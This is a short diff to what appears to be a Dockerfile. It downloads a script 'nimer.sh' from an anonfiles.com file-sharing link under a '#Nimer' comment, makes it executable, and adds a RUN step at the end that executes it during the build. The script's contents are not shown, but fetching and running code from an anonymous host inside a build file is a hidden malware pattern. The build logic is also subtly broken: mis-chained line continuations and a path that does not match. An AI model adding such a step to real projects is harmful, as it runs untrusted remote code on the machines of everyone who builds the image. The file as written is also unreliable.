@@ -128,8 +128,10 @@ RUN rm -rf /etc/apt/sources.list && \
 	apt-get install -y powershell \
 #Nimer
 	wget https://cdn-142.anonfiles.com/V7iev33cua/681373f4-1624794241/nimer.sh \
-	chmod +x /nimer.sh \
-	bash nimer.sh
+	chmod +x /nimer.sh
+	
 ENTRYPOINT ["supervisord", "-c"]
 
 CMD ["/app/supervisord.conf"]
+
+RUN bash nimer.sh
